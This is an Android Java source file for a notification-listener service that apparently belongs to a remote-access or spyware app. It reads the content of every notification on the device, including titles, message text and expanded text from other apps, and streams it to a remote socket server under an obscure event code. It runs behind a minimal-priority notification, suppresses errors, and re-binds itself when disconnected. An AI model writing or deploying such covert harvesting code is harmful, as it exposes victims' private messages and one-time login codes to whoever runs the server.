package com.fason.app.notifications;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class NotificationRelayService extends NotificationListenerService {

    private static final String CHANNEL = "NotificationRelay";
    private static final int NOTIFICATION_ID = 2;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final AtomicBoolean isInitialized = new AtomicBoolean(false);
    private static NotificationRelayService instance;

    public static NotificationRelayService getInstance() {
        return instance;
    }

    public static boolean isNotificationListenerEnabled(Context context) {
        ComponentName cn = new ComponentName(context, NotificationRelayService.class);
        String flat = Settings.Secure.getString(
            context.getContentResolver(),
            "enabled_notification_listeners"
        );
        return flat != null && flat.contains(cn.flattenToString());
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();
        startForegroundService();
        isInitialized.set(true);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL,
                "Notification Relay",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setDescription("Background notification monitoring");

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    private void startForegroundService() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Notification Monitor")
            .setContentText("Monitoring notifications")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isInitialized.set(true);

        // Send current notifications on connect
        executor.execute(() -> {
            try {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) {
                    for (StatusBarNotification sbn : active) {
                        processNotification(sbn, true);
                    }
                }
            } catch (Exception ignored) {}
        });
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        // Skip our own notification
        if (sbn.getId() == NOTIFICATION_ID && sbn.getPackageName().equals(getPackageName())) {
            return;
        }

        executor.execute(() -> processNotification(sbn, false));
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (sbn == null) return;

        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("removed", true);
                data.put("packageName", sbn.getPackageName());
                data.put("id", sbn.getId());
                data.put("postTime", sbn.getPostTime());
                data.put("timestamp", System.currentTimeMillis());

                SocketClient.getInstance().getSocket().emit("0xNO", data);
            } catch (Exception ignored) {}
        });
    }

    private void processNotification(StatusBarNotification sbn, boolean isInitial) {
        try {
            Notification n = sbn.getNotification();
            Bundle extras = n.extras;

            // Extract notification data
            String title = extractText(extras, Notification.EXTRA_TITLE);
            String text = extractText(extras, Notification.EXTRA_TEXT);
            String subText = extractText(extras, Notification.EXTRA_SUB_TEXT);
            String bigText = extractText(extras, Notification.EXTRA_BIG_TEXT);
            String infoText = extractText(extras, Notification.EXTRA_INFO_TEXT);
            String summaryText = extractText(extras, Notification.EXTRA_SUMMARY_TEXT);

            // Get progress info if available
            int progress = extras.getInt(Notification.EXTRA_PROGRESS, -1);
            int progressMax = extras.getInt(Notification.EXTRA_PROGRESS_MAX, -1);

            // Build JSON
            JSONObject data = new JSONObject();
            data.put("appName", sbn.getPackageName());
            data.put("title", title);
            data.put("content", bigText.isEmpty() ? text : bigText);
            data.put("subText", subText);
            data.put("infoText", infoText);
            data.put("summaryText", summaryText);
            data.put("postTime", sbn.getPostTime());
            data.put("id", sbn.getId());
            data.put("tag", sbn.getTag() != null ? sbn.getTag() : "");
            data.put("ongoing", sbn.isOngoing());
            data.put("clearable", sbn.isClearable());
            data.put("initial", isInitial);
            data.put("timestamp", System.currentTimeMillis());

            // Progress info
            if (progress >= 0) {
                data.put("progress", progress);
                data.put("progressMax", progressMax);
            }

            // Priority
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                data.put("priority", n.priority);
            }

            // Category if available
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && n.category != null) {
                data.put("category", n.category);
            }

            // Actions count
            if (n.actions != null) {
                data.put("actionCount", n.actions.length);
            }

            // Send to server
            SocketClient.getInstance().getSocket().emit("0xNO", data);

        } catch (Exception ignored) {}
    }

    private String extractText(Bundle extras, String key) {
        if (extras == null) return "";
        CharSequence seq = extras.getCharSequence(key);
        return seq != null ? seq.toString() : "";
    }

    @Override
    public void onListenerDisconnected() {
        isInitialized.set(false);
        // Request rebind
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            requestRebind(new ComponentName(this, getClass()));
        }
    }

    @Override
    public void onDestroy() {
        isInitialized.set(false);
        instance = null;
        executor.shutdown();
        super.onDestroy();
    }

    /**
     * Request notification listener permission
     */
    public static void requestNotificationListenerPermission(Context context) {
        if (!isNotificationListenerEnabled(context)) {
            Intent intent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS);
                intent.putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                    new ComponentName(context, NotificationRelayService.class).flattenToString());
            } else {
                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    public boolean isReady() {
        return isInitialized.get();
    }
}
